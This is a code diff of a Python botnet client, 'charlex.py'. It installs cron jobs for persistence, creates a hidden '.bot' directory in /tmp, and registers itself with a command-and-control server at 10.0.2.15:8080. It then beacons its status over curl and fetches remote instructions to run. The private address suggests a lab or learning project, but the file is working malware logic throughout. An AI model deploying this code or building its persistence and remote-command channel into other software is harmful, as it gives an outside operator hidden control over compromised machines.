@@ -6,30 +6,33 @@ import requests
 from datetime import datetime
 import time
 
-# Cronjob functions that set up bot to run automatically each day and periodically beacon for instructions.
+# Cronjob functions that set up bot to run 
+# automatically each day and periodically beacon for instructions.
 ##whoami variable ensures that the program will always know where it is  
 def cronjobs():
 	whoami = os.getcwd()+"/charlex.py"
-	start = '(crontab -l 2>/dev/null; echo "0 12 * * * '+whoami+' >/dev/null 2>&1") | crontab -'
-	beacon = '(crontab -l 2>/dev/null; echo "* * * * * '+whoami+' beacon >/dev/null 2>&1")| crontab -'
-	instructions = '(crontab -l 2>/dev/null; echo "* * * * * '+whoami+' instructions >/dev/null 2>&1")| crontab -'
+	start = '(crontab -l 2>/dev/null; echo "0 12 * * * '+whoami+'  >/dev/null >/dev/null 2>&1") | crontab -'
+	beacon = '(crontab -l 2>/dev/null; echo "* * * * * '+whoami+' beacon >/dev/null >/dev/null 2>&1")| crontab -'
+	instructions = '(crontab -l 2>/dev/null; echo "* * * * * '+whoami+' instructions >/dev/null >/dev/null 2>&1")| crontab -'
 	os.system(start)
 	os.system(beacon)
 	os.system(instructions)
+
 #this creates hidden directory '.bot' in the working directory of the program.  
 ## in .bot, it creates a file called name.txt
 def directoryhandler():
-	dir = os.path.join('./','.bot')
+	dir = os.path.join('/tmp','.bot')
 	if not os.path.exists(dir):
 		os.mkdir(dir)
 		os.chdir(dir)
 		f = open('name.txt', 'w+')
 		f.write('')
 		f.close()
+
 #namecheck reads the roster of bots and checks to see if it is listed.  
 #if it is not listed, it names itself and sends its name to the server
 def namecheck():
-	dir = os.path.join('./','.bot')
+	dir = os.path.join('/tmp','.bot')
 	os.chdir(dir)
 	botnames = requests.get('http://10.0.2.15:8080/botnames.txt')
 	data = botnames.text.strip().split()
@@ -38,22 +41,25 @@ def namecheck():
 		if f not in data:
 			myname = str(int(lastbot)+1)
 			f.write(myname)
-			request = 'curl -d '+myname+' {IP}:8080/botnames.txt'
+			request = 'curl -d '+myname+' http://10.0.2.15:8080/botnames.txt'
 			os.system(request)
 		else:
 			close()
-#this is a beacon that runs as a cronjob and sends the current time "Online" and the name of the bot
+
+#this is a beacon that runs as a cronjob 
+#and sends the current time "Online" and the name of the bot
 def beacon():
-	myname = os.path.abspath(".bot/name.txt")
-	rmyname = open(myname, 'r')
+	rmyname = open('/tmp/.bot/name.txt', 'r')
 	x = datetime.now()
 	current_time = x.strftime("%H:%M:%S")
 	data = current_time+' Online '+rmyname.read()
 	request = 'curl -d "'+data+'" http://10.0.2.15:8080/log.txt'
 	os.system(request)
-#this checks the instructions page on the server and does the commands labeled with its name that it sees
+
+#this checks the instructions page on the server 
+#and does the commands labeled with its name that it sees
 def instructions():
-	dir = os.path.abspath('.bot/')
+	dir = '/tmp/.bot/'
 	os.chdir(dir)
 	os.system('curl 10.0.2.15:8080/instructions.txt > response.txt')
 	os.system('cat name.txt > sendthis.txt')
